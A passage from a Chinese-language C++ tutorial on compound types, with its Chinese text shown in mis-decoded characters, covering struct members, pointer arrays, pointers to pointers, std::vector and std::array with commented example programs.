è®°å½•å®é™…å­˜å‚¨çš„æˆç»©æ•°é‡&#125;;int main() &#123; StudentGrades alice; alice.studentName = &quot;Alice&quot;; alice.grades[0] = 95; alice.grades[1] = 88; alice.grades[2] = 92; alice.numGrades = 3; std::cout &lt;&lt; alice.studentName &lt;&lt; &quot;&#x27;s first grade: &quot; &lt;&lt; alice.grades[0] &lt;&lt; std::endl; double sum = 0; for (int i = 0; i &lt; alice.numGrades; ++i) &#123; sum += alice.grades[i]; &#125; if (alice.numGrades &gt; 0) &#123; std::cout &lt;&lt; &quot;Average grade: &quot; &lt;&lt; sum / alice.numGrades &lt;&lt; std::endl; &#125; return 0;&#125; 2. ç»“æ„åŒ…å«æŒ‡é’ˆæˆå‘˜: ç»“æ„ä½“å¯ä»¥åŒ…å«æŒ‡é’ˆä½œä¸ºæˆå‘˜ã€‚è¿™å¸¸ç”¨äºæŒ‡å‘åŠ¨æ€åˆ†é…çš„å†…å­˜æˆ–æŒ‡å‘å…¶ä»–æ•°æ®ç»“æ„ã€‚ 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;string&gt;struct DynamicData &#123; std::string label; int* data_ptr; // æŒ‡å‘åŠ¨æ€åˆ†é…çš„ int æ•°ç»„ int size;&#125;;int main() &#123; DynamicData myData; myData.label = &quot;Sensor Readings&quot;; myData.size = 10; myData.data_ptr = new int[myData.size]; // åŠ¨æ€åˆ†é…å†…å­˜ // åˆå§‹åŒ–åŠ¨æ€æ•°æ® for (int i = 0; i &lt; myData.size; ++i) &#123; myData.data_ptr[i] = i * i; &#125; std::cout &lt;&lt; &quot;Label: &quot; &lt;&lt; myData.label &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Data at index 3: &quot; &lt;&lt; myData.data_ptr[3] &lt;&lt; std::endl; // è¾“å‡º 9 // **é‡è¦:** å¿…é¡»æ‰‹åŠ¨é‡Šæ”¾æŒ‡é’ˆæˆå‘˜æŒ‡å‘çš„åŠ¨æ€å†…å­˜ delete [] myData.data_ptr; myData.data_ptr = nullptr; // é¿å…æ‚¬æŒ‚æŒ‡é’ˆ return 0;&#125; æ³¨æ„: å½“ç»“æ„åŒ…å«æŒ‡é’ˆæˆå‘˜æŒ‡å‘åŠ¨æ€å†…å­˜æ—¶ï¼Œéœ€è¦ç‰¹åˆ«æ³¨æ„å†…å­˜ç®¡ç†ï¼ˆå¤åˆ¶ã€èµ‹å€¼ã€ææ„ï¼‰ï¼Œè¿™é€šå¸¸æ¶‰åŠåˆ°ç±»çš„ç‰¹æ®Šæˆå‘˜å‡½æ•°ï¼ˆæ‹·è´æ„é€ å‡½æ•°ã€æ‹·è´èµ‹å€¼è¿ç®—ç¬¦ã€ææ„å‡½æ•°ï¼‰ï¼Œæˆ‘ä»¬å°†åœ¨åç»­ç« èŠ‚æ·±å…¥å­¦ä¹ ã€‚ 3. æŒ‡é’ˆæ•°ç»„ (Array of Pointers): å¯ä»¥åˆ›å»ºæ•°ç»„ï¼Œå…¶æ¯ä¸ªå…ƒç´ éƒ½æ˜¯ä¸€ä¸ªæŒ‡é’ˆã€‚ 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;int main() &#123; int a = 10, b = 20, c = 30; int* ptr_array[3]; // å£°æ˜ä¸€ä¸ªåŒ…å« 3 ä¸ª int* æŒ‡é’ˆçš„æ•°ç»„ ptr_array[0] = &amp;a; // ç¬¬ä¸€ä¸ªå…ƒç´ æŒ‡å‘ a ptr_array[1] = &amp;b; // ç¬¬äºŒä¸ªå…ƒç´ æŒ‡å‘ b ptr_array[2] = &amp;c; // ç¬¬ä¸‰ä¸ªå…ƒç´ æŒ‡å‘ c std::cout &lt;&lt; &quot;Values via pointer array:&quot; &lt;&lt; std::endl; for (int i = 0; i &lt; 3; ++i) &#123; std::cout &lt;&lt; &quot; Value at *ptr_array[&quot; &lt;&lt; i &lt;&lt; &quot;]: &quot; &lt;&lt; *ptr_array[i] &lt;&lt; std::endl; &#125; // ä¹Ÿå¯ä»¥æŒ‡å‘åŠ¨æ€åˆ†é…çš„å†…å­˜ int* dyn_ptr_array[2]; dyn_ptr_array[0] = new int(100); dyn_ptr_array[1] = new int(200); std::cout &lt;&lt; &quot;\\nDynamic values:&quot; &lt;&lt; std::endl; std::cout &lt;&lt; *dyn_ptr_array[0] &lt;&lt; std::endl; std::cout &lt;&lt; *dyn_ptr_array[1] &lt;&lt; std::endl; // é‡Šæ”¾åŠ¨æ€å†…å­˜ delete dyn_ptr_array[0]; delete dyn_ptr_array[1]; dyn_ptr_array[0] = nullptr; dyn_ptr_array[1] = nullptr; return 0;&#125; æŒ‡é’ˆæ•°ç»„å¸¸ç”¨äºå­˜å‚¨ C é£æ ¼å­—ç¬¦ä¸²æ•°ç»„ï¼ˆconst char*[]ï¼‰æˆ–ç®¡ç†ä¸€ç»„åŠ¨æ€åˆ†é…çš„å¯¹è±¡ã€‚ 4. æŒ‡å‘æŒ‡é’ˆçš„æŒ‡é’ˆ (Pointer to Pointer): æŒ‡é’ˆæœ¬èº«ä¹Ÿæ˜¯å˜é‡ï¼Œå®ƒä¹Ÿæœ‰è‡ªå·±çš„å†…å­˜åœ°å€ã€‚å› æ­¤ï¼Œå¯ä»¥å£°æ˜ä¸€ä¸ªæŒ‡å‘æŒ‡é’ˆçš„æŒ‡é’ˆã€‚ 123456789101112131415161718192021222324#include &lt;iostream&gt;int main() &#123; int value = 42; int *ptr = &amp;value; // ptr æŒ‡å‘ value (int*) int **pptr = &amp;ptr; // pptr æŒ‡å‘ ptr (int**) std::cout &lt;&lt; &quot;Value: &quot; &lt;&lt; value &lt;&lt; std::endl; // 42 std::cout &lt;&lt; &quot;Address of value (&amp;value): &quot; &lt;&lt; &amp;value &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Value of ptr (address of value): &quot; &lt;&lt; ptr &lt;&lt; std::endl; // value çš„åœ°å€ std::cout &lt;&lt; &quot;Value via ptr (*ptr): &quot; &lt;&lt; *ptr &lt;&lt; std::endl; // 42 std::cout &lt;&lt; &quot;Address of ptr (&amp;ptr): &quot; &lt;&lt; &amp;ptr &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Value of pptr (address of ptr): &quot; &lt;&lt; pptr &lt;&lt; std::endl; // ptr çš„åœ°å€ std::cout &lt;&lt; &quot;Value via pptr (*pptr): &quot; &lt;&lt; *pptr &lt;&lt; std::endl; // ptr çš„å€¼ (å³ value çš„åœ°å€) std::cout &lt;&lt; &quot;Value via pptr (**pptr): &quot; &lt;&lt; **pptr &lt;&lt; std::endl; // value çš„å€¼ (42) // ä¿®æ”¹å€¼ **pptr = 50; std::cout &lt;&lt; &quot;New value: &quot; &lt;&lt; value &lt;&lt; std::endl; // è¾“å‡º 50 return 0;&#125; æŒ‡å‘æŒ‡é’ˆçš„æŒ‡é’ˆå¸¸ç”¨äºï¼š åœ¨å‡½æ•°ä¸­ä¿®æ”¹è°ƒç”¨è€…ä¼ å…¥çš„æŒ‡é’ˆæœ¬èº«ï¼ˆä½¿å…¶æŒ‡å‘ä¸åŒçš„åœ°å€ï¼‰ã€‚ å¤„ç†åŠ¨æ€åˆ†é…çš„æŒ‡é’ˆæ•°ç»„ï¼ˆä¾‹å¦‚ char** argv in mainï¼‰ã€‚ æ€»ç»“: é€šè¿‡ç»„åˆåŸºæœ¬ç±»å‹ã€æ•°ç»„ã€ç»“æ„ã€æŒ‡é’ˆç­‰ï¼Œå¯ä»¥æ„å»ºå‡ºéå¸¸çµæ´»å’Œå¼ºå¤§çš„æ•°æ®ç»“æ„ã€‚ç†è§£æ¯ç§ç»„åˆæ–¹å¼çš„å†…å­˜å¸ƒå±€ã€è®¿é—®æ–¹å¼ä»¥åŠï¼ˆç‰¹åˆ«æ˜¯æ¶‰åŠæŒ‡é’ˆå’ŒåŠ¨æ€å†…å­˜æ—¶ï¼‰ç”Ÿå‘½å‘¨æœŸç®¡ç†è§„åˆ™æ˜¯ç¼–å†™å¤æ‚ C++ç¨‹åºçš„å…³é”®ã€‚éšç€å­¦ä¹ çš„æ·±å…¥ï¼Œæˆ‘ä»¬å°†çœ‹åˆ°æ›´å¤šé«˜çº§çš„ç»„åˆå’ŒæŠ½è±¡æ–¹å¼ï¼Œä¾‹å¦‚ä½¿ç”¨ç±»å’Œæ ‡å‡†åº“å®¹å™¨ã€‚ 4.10 æ•°ç»„çš„æ›¿ä»£å“è™½ç„¶ C++ å†…ç½®çš„æ•°ç»„ï¼ˆåŒ…æ‹¬åŠ¨æ€åˆ†é…çš„æ•°ç»„ï¼‰åŠŸèƒ½å¼ºå¤§ï¼Œä½†å®ƒä»¬å­˜åœ¨ä¸€äº›å›ºæœ‰çš„ç¼ºç‚¹ï¼šæ•°ç»„å¤§å°é€šå¸¸éœ€è¦åœ¨ç¼–è¯‘æ—¶ç¡®å®šï¼ˆå¯¹äºæ ˆä¸Šçš„æ•°ç»„ï¼‰ï¼Œæˆ–è€…éœ€è¦æ‰‹åŠ¨è¿›è¡ŒåŠ¨æ€å†…å­˜ç®¡ç†ï¼ˆå¯¹äºå †ä¸Šçš„æ•°ç»„ï¼‰ï¼Œå¹¶ä¸”ä¸æä¾›è¾¹ç•Œæ£€æŸ¥ç­‰å®‰å…¨ç‰¹æ€§ã€‚ C++ æ ‡å‡†æ¨¡æ¿åº“ (STL) æä¾›äº†æ›´å®‰å…¨ã€æ›´çµæ´»çš„æ•°ç»„æ›¿ä»£å“ï¼švector å’Œ arrayã€‚ 4.10.1 æ¨¡æ¿ç±»vectorstd::vector æ˜¯ STL æä¾›çš„ä¸€ä¸ªåŠ¨æ€æ•°ç»„æ¨¡æ¿ç±»ã€‚å®ƒå°è£…äº†åŠ¨æ€å¤§å°çš„æ•°ç»„ï¼Œå¯ä»¥æ ¹æ®éœ€è¦è‡ªåŠ¨å¢é•¿æˆ–ç¼©å°ï¼Œå¹¶è´Ÿè´£ç®¡ç†å…¶å…ƒç´ çš„å†…å­˜ã€‚ ç‰¹ç‚¹: åŠ¨æ€å¤§å°: å¯ä»¥åœ¨è¿è¡Œæ—¶æ·»åŠ æˆ–åˆ é™¤å…ƒç´ ï¼Œvector ä¼šè‡ªåŠ¨å¤„ç†å†…å­˜çš„é‡æ–°åˆ†é…ã€‚ å†…å­˜ç®¡ç†: è‡ªåŠ¨ç®¡ç†å…ƒç´ å­˜å‚¨çš„å†…å­˜ï¼ˆé€šå¸¸åœ¨è‡ªç”±å­˜å‚¨åŒº/å †ä¸Šåˆ†é…ï¼‰ã€‚ éšæœºè®¿é—®: åƒæ™®é€šæ•°ç»„ä¸€æ ·ï¼Œå¯ä»¥é€šè¿‡ç´¢å¼• [] å¿«é€Ÿè®¿é—®ä»»ä½•å…ƒç´ ã€‚ è¾¹ç•Œæ£€æŸ¥ (å¯é€‰): æä¾› at() æˆå‘˜å‡½æ•°è¿›è¡Œå¸¦è¾¹ç•Œæ£€æŸ¥çš„å…ƒç´ è®¿é—®ã€‚ ä¸°å¯Œçš„æˆå‘˜å‡½æ•°: æä¾› push_back(), pop_back(), size(), empty(), clear(), insert(), erase() ç­‰å¤šç§æ–¹ä¾¿çš„æ“ä½œã€‚ æ¨¡æ¿ç±»: vector æ˜¯ä¸€ä¸ªæ¨¡æ¿ï¼Œéœ€è¦æŒ‡å®šå­˜å‚¨çš„å…ƒç´ ç±»å‹ï¼Œä¾‹å¦‚ std::vector&lt;int&gt;, std::vector&lt;double&gt;, std::vector&lt;std::string&gt;ã€‚ ä½¿ç”¨æ–¹æ³•: åŒ…å«å¤´æ–‡ä»¶: #include &lt;vector&gt; å£°æ˜å’Œåˆå§‹åŒ–: 1234567891011#include &lt;vector&gt;#include &lt;string&gt;// å£°æ˜std::vector&lt;int&gt; scores; // åˆ›å»ºä¸€ä¸ªç©ºçš„ int vectorstd::vector&lt;double&gt; lengths(10); // åˆ›å»ºåŒ…å« 10 ä¸ª double å…ƒç´ çš„ vector (é»˜è®¤åˆå§‹åŒ–ä¸º 0.0)std::vector&lt;std::string&gt; names(5, &quot;Unknown&quot;); // åˆ›å»ºåŒ…å« 5 ä¸ª string å…ƒç´ ï¼Œéƒ½åˆå§‹åŒ–ä¸º &quot;Unknown&quot;// C++11 åˆ—è¡¨åˆå§‹åŒ–std::vector&lt;int&gt; primes &#123;2, 3, 5, 7, 11&#125;; // åˆ›å»ºå¹¶åˆå§‹åŒ–std::vector&lt;char&gt; vowels &#123;&#x27;a&#x27;, &#x27;e&#x27;, &#x27;i&#x27;, &#x27;o&#x27;, &#x27;u&#x27;&#125;; è®¿é—®å…ƒç´ : [] è¿ç®—ç¬¦: scores[0], names[i] (ä¸è¿›è¡Œè¾¹ç•Œæ£€æŸ¥)ã€‚ at() å‡½æ•°: scores.at(0), names.at(i) (è¿›è¡Œè¾¹ç•Œæ£€æŸ¥ï¼Œè¶Šç•ŒæŠ›å‡º std::out_of_range å¼‚å¸¸)ã€‚ å¸¸ç”¨æ“ä½œ: push_back(value): åœ¨ vector æœ«å°¾æ·»åŠ ä¸€ä¸ªå…ƒç´ ã€‚ size(): è¿”å› vector ä¸­å…ƒç´ çš„æ•°é‡ã€‚ empty(): æ£€æŸ¥ vector æ˜¯å¦ä¸ºç©ºã€‚ clear(): ç§»é™¤æ‰€æœ‰å…ƒç´ ã€‚ pop_back(): ç§»é™¤æœ«å°¾çš„å…ƒç´ ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;string&gt;int main() &#123; // åˆ›å»ºå’Œåˆå§‹åŒ– std::vector&lt;int&gt; numbers; // ç©º vector std::vector&lt;std::string&gt; tasks &#123;&quot;Read&quot;, &quot;Write&quot;, &quot;Code&quot;&#125;; // æ·»åŠ å…ƒç´  numbers.push_back(10); // numbers: &#123;10&#125; numbers.push_back(20); // numbers: &#123;10, 20&#125; numbers.push_back(30); // numbers: &#123;10, 20, 30&#125; // è®¿é—®å…ƒç´  std::cout &lt;&lt; &quot;First number: &quot; &lt;&lt; numbers[0] &lt;&lt; std::endl; // è¾“å‡º 10 std::cout &lt;&lt; &quot;Second task: &quot; &lt;&lt; tasks.at(1) &lt;&lt; std::endl; // è¾“å‡º Write // std::cout &lt;&lt; tasks.at(3); // ä¼šæŠ›å‡ºå¼‚å¸¸ // ä¿®æ”¹å…ƒç´  numbers[0] = 15; // è·å–å¤§å° std::cout &lt;&lt; &quot;Number of tasks: &quot; &lt;&lt; tasks.size() &lt;&lt; std::endl; // è¾“å‡º 3 // éå† vector (C++11 åŸºäºèŒƒå›´çš„ for å¾ªç¯) std::cout &lt;&lt; &quot;Numbers:&quot;; for (int num : numbers) &#123; std::cout &lt;&lt; &quot; &quot; &lt;&lt; num; &#125; std::cout &lt;&lt; std::endl; // è¾“å‡º Numbers: 15 20 30 // éå† vector (ä¼ ç»Ÿ for å¾ªç¯) std::cout &lt;&lt; &quot;Tasks:&quot;; for (size_t i = 0; i &lt; tasks.size(); ++i) &#123; // ä½¿ç”¨ size_t ä½œä¸ºç´¢å¼•ç±»å‹ std::cout &lt;&lt; &quot; &quot; &lt;&lt; tasks[i]; &#125; std::cout &lt;&lt; std::endl; // è¾“å‡º Tasks: Read Write Code // ç§»é™¤æœ«å°¾å…ƒç´  numbers.pop_back(); // numbers: &#123;15, 20&#125; std::cout &lt;&lt; &quot;Last number after pop: &quot; &lt;&lt; numbers.back() &lt;&lt; std::endl; // back() è®¿é—®æœ€åä¸€ä¸ªå…ƒç´  return 0;&#125; std::vector æ˜¯ C++ ä¸­æ›¿ä»£åŠ¨æ€æ•°ç»„çš„é¦–é€‰æ–¹æ¡ˆï¼Œå› ä¸ºå®ƒæ›´å®‰å…¨ã€æ›´æ˜“äºç®¡ç†ã€‚ 4.10.2 æ¨¡æ¿ç±»arrayï¼ˆC++11ï¼‰C++11 å¼•å…¥äº† std::array æ¨¡æ¿ç±»ï¼Œå®ƒå°è£…äº†å›ºå®šå¤§å°çš„æ•°ç»„ã€‚ä¸ C é£æ ¼æ•°ç»„ç±»ä¼¼ï¼Œå…¶å¤§å°åœ¨ç¼–è¯‘æ—¶ç¡®å®šï¼Œä½†å®ƒæä¾›äº†æ›´ç°ä»£çš„æ¥å£å’Œä¸€äº› vector å…·æœ‰çš„ä¾¿åˆ©æ€§ï¼ˆå¦‚ size(), at()ï¼‰ã€‚ ç‰¹ç‚¹: å›ºå®šå¤§å°: æ•°ç»„å¤§å°å¿…é¡»åœ¨ç¼–è¯‘æ—¶æŒ‡å®šä¸ºæ¨¡æ¿å‚æ•°ï¼Œä¹‹åä¸èƒ½æ”¹å˜ã€‚ å†…å­˜ä½ç½®: é€šå¸¸åœ¨æ ˆä¸Šåˆ†é…å†…å­˜ï¼ˆå¦‚æœä½œä¸ºå±€éƒ¨å˜é‡å£°æ˜ï¼‰ï¼Œä¸ C é£æ ¼æ•°ç»„ç±»ä¼¼ï¼Œé™¤éæ˜¾å¼ä½¿ç”¨ new åˆ›å»ºã€‚ ç±»å‹å®‰å…¨: å¤§å°æ˜¯ç±»å‹çš„ä¸€éƒ¨åˆ† (std::array&lt;int, 5&gt; å’Œ std::array&lt;int, 10&gt; æ˜¯ä¸åŒçš„ç±»å‹)ã€‚ STL æ¥å£: æä¾›ä¸ vector ç±»ä¼¼çš„æ¥å£ï¼Œå¦‚ size(), empty(), at(), [], front(), back()ï¼Œä»¥åŠè¿­ä»£å™¨æ”¯æŒï¼Œå¯ä»¥æ–¹ä¾¿åœ°ä¸ STL ç®—æ³•ä¸€èµ·ä½¿ç”¨ã€‚ æ— å¼€é”€æŠ½è±¡: é€šå¸¸ä¸ä¼šæ¯” C é£æ ¼æ•°ç»„å¸¦æ¥é¢å¤–çš„è¿è¡Œæ—¶æ€§èƒ½å¼€é”€ã€‚ æ¨¡æ¿ç±»: éœ€è¦æŒ‡å®šå…ƒç´ ç±»å‹å’Œå¤§å°ï¼Œä¾‹å¦‚ std::array&lt;int, 10&gt;, std::array&lt;double, 3&gt;ã€‚ ä½¿ç”¨æ–¹æ³•: åŒ…å«å¤´æ–‡ä»¶: #include &lt;array&gt; å£°æ˜å’Œåˆå§‹åŒ–: 123456789101112131415#include &lt;array&gt;#include &lt;string&gt;// å£°æ˜std::array&lt;int, 5&gt; scores; // åˆ›å»ºåŒ…å« 5 ä¸ª int çš„ array (å…ƒç´ å€¼æœªå®šä¹‰ï¼Œé™¤éæ˜¯é™æ€å­˜å‚¨)std::array&lt;double, 3&gt; coords &#123;&#125;; // åˆ›å»ºåŒ…å« 3 ä¸ª double çš„ array, é›¶åˆå§‹åŒ– &#123;0.0, 0.0, 0.0&#125;// C++11 åˆ—è¡¨åˆå§‹åŒ–std::array&lt;int, 4&gt; values &#123;1, 2, 3, 4&#125;; // åˆ›å»ºå¹¶åˆå§‹åŒ–std::array&lt;std::string, 2&gt; names &#123;&quot;Alice&quot;, &quot;Bob&quot;&#125;;// æ³¨æ„: åˆå§‹åŒ–åˆ—è¡¨çš„å…ƒç´ æ•°é‡ä¸èƒ½è¶…è¿‡ array çš„å¤§å°// std::array&lt;int, 3&gt; errors &#123;1, 2, 3, 4&#125;; // é”™è¯¯!// å¦‚æœå…ƒç´ æ•°é‡å°‘äº array å¤§å°ï¼Œå‰©ä½™å…ƒç´ ä¼šè¢«å€¼åˆå§‹åŒ– (é€šå¸¸ä¸º 0)std::array&lt;int, 5&gt; partial &#123;10, 20&#125;; // &#123;10, 20, 0, 0, 0&#125; è®¿é—®å…ƒç´ : [] è¿ç®—ç¬¦: scores[0], names[i] (ä¸è¿›è¡Œè¾¹ç•Œæ£€æŸ¥)ã€‚ at() å‡½æ•°: scores.at(0), names.at(i) (è¿›è¡Œè¾¹ç•Œæ£€æŸ¥ï¼Œè¶Šç•ŒæŠ›å‡º std::out_of_range å¼‚å¸¸)ã€‚ å¸¸ç”¨æ“ä½œ: size(): è¿”å›æ•°ç»„çš„å¤§å°ï¼ˆç¼–è¯‘æ—¶å¸¸é‡ï¼‰ã€‚ empty(): æ£€æŸ¥æ•°ç»„æ˜¯å¦ä¸ºç©ºï¼ˆå¯¹äºå¤§å° &gt; 0 çš„ std::array æ€»æ˜¯è¿”å› falseï¼‰ã€‚ fill(value): å°†æ‰€æœ‰å…ƒç´ è®¾ç½®ä¸ºæŒ‡å®šå€¼ã€‚ front(): è®¿é—®ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚ back(): è®¿é—®æœ€åä¸€ä¸ªå…ƒç´ ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;array&gt;#include &lt;string&gt;#include &lt;numeric&gt; // ä¸ºäº† std::accumulateint main() &#123; // åˆ›å»ºå’Œåˆå§‹åŒ– std::array&lt;int, 5&gt; data &#123;10, 20, 30, 40, 50&#125;; std::array&lt;std::string, 3&gt; colors &#123;&quot;Red&quot;, &quot;Green&quot;, &quot;Blue&quot;&#125;; std::array&lt;double, 4&gt; temps &#123;&#125;; // &#123;0.0, 0.0, 0.0, 0.0&#125; // è®¿é—®å…ƒç´  std::cout &lt;&lt; &quot;First data element: &quot; &lt;&lt; data[0] &lt;&lt; std::endl; // è¾“å‡º 10 std::cout &lt;&lt; &quot;Second color: &quot; &lt;&lt; colors.at(1) &lt;&lt; std::endl; // è¾“å‡º Green std::cout &lt;&lt; &quot;A temperature: &quot; &lt;&lt; temps[2] &lt;&lt; std::endl; // è¾“å‡º 0 // è·å–å¤§å° std::cout &lt;&lt; &quot;Size of data array: &quot; &lt;&lt; data.size() &lt;&lt; std::endl; // è¾“å‡º 5 // å¡«å…… temps.fill(25.5); std::cout &lt;&lt; &quot;Filled temperature: &quot; &lt;&lt; temps[0] &lt;&lt; std::endl; // è¾“å‡º 25.5 // éå† (C++11 åŸºäºèŒƒå›´çš„ for å¾ªç¯) std::cout &lt;&lt; &quot;Colors:&quot;; for (const auto&amp; color : colors) &#123; // ä½¿ç”¨ const å¼•ç”¨é¿å…å¤åˆ¶ std::cout &lt;&lt; &quot; &quot; &lt;&lt; color; &#125; std::cout &lt;&lt; std::endl; // è¾“å‡º Colors: Red Green Blue // ä¸ STL ç®—æ³•ä¸€èµ·ä½¿ç”¨ double sum = std::accumulate(temps.begin(), temps.end(), 0.0); // è®¡ç®—æ€»å’Œ std::cout &lt;&lt; &quot;Sum of temperatures: &quot; &lt;&lt; sum &lt;&lt; std::endl; return 0;&#125; std::array æ˜¯æ›¿ä»£éœ€è¦å›ºå®šå¤§å°æ•°ç»„çš„ C é£æ ¼æ•°ç»„çš„ç°ä»£ C++ æ–¹æ¡ˆã€‚ 4.10.3 æ¯”è¾ƒæ•°ç»„ã€vectorå¯¹è±¡å’Œarrayå¯¹è±¡ ç‰¹æ€§ C é£æ ¼æ•°ç»„ (T[]) std::vector&lt;T&gt; std::array&lt;T, N&gt; (C++11) å¤§å° å›ºå®š (ç¼–è¯‘æ—¶ç¡®å®šæ ˆæ•°ç»„ï¼Œè¿è¡Œæ—¶ç¡®å®šå †æ•°ç»„) åŠ¨æ€ (å¯è¿è¡Œæ—¶æ”¹å˜) å›ºå®š (ç¼–è¯‘æ—¶ç¡®å®š) å†…å­˜åˆ†é… æ ˆ (å±€éƒ¨) æˆ– é™æ€åŒº æˆ– å † (new[]) é€šå¸¸åœ¨å †ä¸Š (è‡ªç”±å­˜å‚¨åŒº) é€šå¸¸åœ¨æ ˆä¸Š (é™¤éç”¨ new åˆ›å»º) å¤§å°ä¿¡æ¯ æ— å†…ç½®æ–¹æ³•è·å–å¤§å° (éœ€å•ç‹¬ä¼ é€’) size() æˆå‘˜å‡½æ•° size() æˆå‘˜å‡½æ•° (ç¼–è¯‘æ—¶å¸¸é‡) è¾¹ç•Œæ£€æŸ¥ æ—  (ä¸å®‰å…¨) at() æä¾›æ£€æŸ¥, [] ä¸æä¾› at() æä¾›æ£€æŸ¥, [] ä¸æä¾› èµ‹å€¼/å¤åˆ¶ ä¸èƒ½ç›´æ¥èµ‹å€¼/å¤åˆ¶æ•´ä¸ªæ•°ç»„ å¯ä»¥ç›´æ¥èµ‹å€¼/å¤åˆ¶ (æ·±æ‹·è´) å¯ä»¥ç›´æ¥èµ‹å€¼/å¤åˆ¶ (æˆå‘˜é€ä¸€å¤åˆ¶) ä½œä¸ºå‡½æ•°å‚æ•° é€šå¸¸é€€åŒ–ä¸ºæŒ‡é’ˆ (ä¸¢å¤±å¤§å°ä¿¡æ¯) å¯ä»¥æŒ‰å€¼ã€å¼•ç”¨æˆ–æŒ‡é’ˆä¼ é€’ å¯ä»¥æŒ‰å€¼ã€å¼•ç”¨æˆ–æŒ‡é’ˆä¼ é€’ STL å…¼å®¹æ€§ æœ‰é™ (éœ€è¦æŒ‡é’ˆå’Œå¤§å°) å®Œå…¨å…¼å®¹ (æä¾›è¿­ä»£å™¨ç­‰) å®Œå…¨å…¼å®¹ (æä¾›è¿­ä»£å™¨ç­‰) æ€§èƒ½ é€šå¸¸æœ€å¿« (ç›´æ¥å†…å­˜è®¿é—®) è®¿é—®é€Ÿåº¦å¿«ï¼Œæ·»åŠ /åˆ é™¤å¯èƒ½æ¶‰åŠå†…å­˜é‡åˆ†é… é€šå¸¸ä¸ C é£æ ¼æ•°ç»„æ€§èƒ½ç›¸åŒ å¤´æ–‡ä»¶ æ— éœ€ &lt;vector&gt; &lt;array&gt; é€‰æ‹©å»ºè®®: éœ€è¦åŠ¨æ€å¤§å°: å¦‚æœæ•°ç»„å¤§å°åœ¨è¿è¡Œæ—¶æ‰èƒ½ç¡®å®šï¼Œæˆ–è€…éœ€è¦åœ¨ç¨‹åºè¿è¡ŒæœŸé—´æ”¹å˜å¤§å°ï¼Œ**std::vector æ˜¯æœ€ä½³é€‰æ‹©**ã€‚ éœ€è¦å›ºå®šå¤§å° (ç¼–è¯‘æ—¶å·²çŸ¥): å¦‚æœæ•°ç»„å¤§å°åœ¨ç¼–è¯‘æ—¶å°±ç¡®å®šä¸”ä¸ä¼šæ”¹å˜ï¼š **ä¼˜å…ˆé€‰æ‹© std::array (C++11 åŠä»¥å)**ã€‚å®ƒæä¾›äº†ä¸ C é£æ ¼æ•°ç»„ç›¸åŒçš„æ€§èƒ½å’Œå†…å­˜å¸ƒå±€ï¼ˆé€šå¸¸åœ¨æ ˆä¸Šï¼‰ï¼Œä½†å…·æœ‰æ›´å®‰å…¨ã€æ›´æ–¹ä¾¿çš„æ¥å£ï¼ˆå¦‚ size(), at(), è¿­ä»£å™¨ï¼‰ã€‚ å¦‚æœä¸èƒ½ä½¿ç”¨ C++11 æˆ–æœ‰ç‰¹å®š C æ¥å£å…¼å®¹æ€§éœ€æ±‚ï¼Œå¯ä»¥ä½¿ç”¨ C é£æ ¼æ•°ç»„ï¼Œä½†è¦ç‰¹åˆ«æ³¨æ„å®‰å…¨æ€§å’Œå¤§å°ç®¡ç†ã€‚ æ€§èƒ½å…³é”®ä¸”å¤§å°å›ºå®š: std::array å’Œ C é£æ ¼æ•°ç»„é€šå¸¸æ€§èƒ½æœ€ä½³ã€‚ æ€»çš„æ¥è¯´ï¼Œåœ¨ç°ä»£ C++ ä¸­ï¼Œåº”ä¼˜å…ˆä½¿ç”¨ std::vector å’Œ std::array è€Œä¸æ˜¯ C é£æ ¼æ•°ç»„ï¼Œä»¥è·å¾—æ›´å¥½çš„ç±»å‹å®‰å…¨ã€å†…å­˜ç®¡ç†å’Œæ˜“ç”¨æ€§ã€‚ 4.11 æ€»ç»“æœ¬ç« ä»‹ç»äº†C++çš„**å¤åˆç±»å‹ (Compound Types)**ï¼Œå®ƒä»¬å…è®¸æˆ‘ä»¬å°†å¤šä¸ªå€¼ç»„åˆæˆä¸€ä¸ªæ•°æ®å•å…ƒã€‚ æˆ‘ä»¬é¦–å…ˆå­¦ä¹ äº†**æ•°ç»„ (Array)**ï¼Œå®ƒç”¨äºå­˜å‚¨ä¸€ç³»åˆ—ç›¸åŒç±»å‹çš„æ•°æ®ã€‚æˆ‘ä»¬äº†è§£äº†å¦‚ä½•å£°æ˜æ•°ç»„ã€ä½¿ç”¨ç´¢å¼•è®¿é—®å…ƒç´ ï¼ˆä»0å¼€å§‹ï¼‰ï¼Œä»¥åŠåˆå§‹åŒ–æ•°ç»„çš„å„ç§è§„åˆ™ï¼ŒåŒ…æ‹¬C++11å¼•å…¥çš„æ›´å®‰å…¨çš„åˆ—è¡¨åˆå§‹åŒ–æ–¹æ³•ã€‚æˆ‘ä»¬å¼ºè°ƒäº†æ•°ç»„å¤§å°å¿…é¡»æ˜¯å¸¸é‡è¡¨è¾¾å¼ï¼Œå¹¶ä¸”è®¿é—®æ•°ç»„æ—¶éœ€è¦æ³¨æ„è¾¹ç•Œï¼Œé¿å…è¶Šç•Œè®¿é—®ã€‚ æ¥ç€ï¼Œæˆ‘ä»¬æ¢è®¨äº†å¤„ç†æ–‡æœ¬æ•°æ®çš„ä¸¤ç§æ–¹å¼ã€‚ç¬¬ä¸€ç§æ˜¯ä¼ ç»Ÿçš„Cé£æ ¼å­—ç¬¦ä¸²ï¼Œå³ä»¥ç©ºå­—ç¬¦ \\0 ç»“å°¾çš„ char æ•°ç»„ã€‚æˆ‘ä»¬å­¦ä¹ äº†å¦‚ä½•æ‹¼æ¥å­—ç¬¦ä¸²å¸¸é‡ã€åœ¨æ•°ç»„ä¸­ä½¿ç”¨å­—ç¬¦ä¸²ã€ä»¥åŠä½¿ç”¨ cin å’Œ getline 